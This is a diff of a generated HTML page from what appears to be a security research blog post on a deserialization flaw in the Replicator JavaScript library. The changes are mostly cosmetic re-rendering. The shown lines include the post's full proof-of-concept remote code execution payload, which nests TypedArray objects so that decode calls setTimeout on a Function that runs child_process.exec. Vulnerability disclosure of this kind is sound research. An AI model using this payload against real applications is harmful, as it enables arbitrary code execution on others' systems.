@@ -63,7 +63,7 @@
 
 
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Yaniv Nizry Blogs" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Yaniv Nizry Blogs" type="application/atom+xml">
 </head>
 
 <body>
@@ -263,7 +263,7 @@
 
 <ol start="4">
 <li>Must be a valid JSON.<ul>
-<li>As mentioned before, Replicator wraps around JSON parse and stringify. Due to that, the input string given to the decode function gets “JSON.parse” before going into the problematic “fromSerializable” function. So, calling “setImmediate” / “setInterval” / “setTimeout” isn’t possible because it requires a callback function as an input and that isn’t JSON valid.</li>
+<li>As mentioned before, Replicator wraps around JSON parse and stringify. Due to that, the input string given to the decode function gets “JSON.parse” before going into the problematic “fromSerializable” function. So, calling “setImmediate” &#x2F; “setInterval” &#x2F; “setTimeout” isn’t possible because it requires a callback function as an input and that isn’t JSON valid.</li>
 </ul>
 </li>
 </ol>
@@ -292,9 +292,9 @@
 <p>After fuzzing and some more research, we asked ourselves what happens if we serialize a <em><strong>Set</strong></em> within a <em><strong>Set</strong></em>. What would that look like? Is it done recursively?</p>
 <img src="/img/blogs/replicator/Image-14.png" style="width: 100%;"/>
 
-<p>When understanding that the serialization/deserialization is done recursively, the payload to an RCE was around the corner. As mentioned before, we can create a new “Function”, but nothing will run it, and we can call “setTimeout,” but have to give it a function to execute.</p>
+<p>When understanding that the serialization&#x2F;deserialization is done recursively, the payload to an RCE was around the corner. As mentioned before, we can create a new “Function”, but nothing will run it, and we can call “setTimeout,” but have to give it a function to execute.</p>
 <p>Combining these two, here is the final payload to trigger code execution:</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replicator.decode(<span class="string">&#x27;[&#123;&quot;@t&quot;:&quot;[[TypedArray]]&quot;,&quot;data&quot;:&#123;&quot;ctorName&quot;:&quot;setTimeout&quot;,&quot;arr&quot;:​&#123;&quot;@t&quot;:&quot;[[TypedArray]]&quot;,&quot;data&quot;:&#123;&quot;ctorName&quot;:&quot;Function&quot;,&quot;arr&quot;:&quot; process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);&quot;&#125;&#125;​&#125;&#125;]&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replicator.<span class="title function_">decode</span>(<span class="string">&#x27;[&#123;&quot;@t&quot;:&quot;[[TypedArray]]&quot;,&quot;data&quot;:&#123;&quot;ctorName&quot;:&quot;setTimeout&quot;,&quot;arr&quot;:​&#123;&quot;@t&quot;:&quot;[[TypedArray]]&quot;,&quot;data&quot;:&#123;&quot;ctorName&quot;:&quot;Function&quot;,&quot;arr&quot;:&quot; process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);&quot;&#125;&#125;​&#125;&#125;]&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
 <img src="/img/blogs/replicator/Image-15.png" style="width: 100%;"/>
 
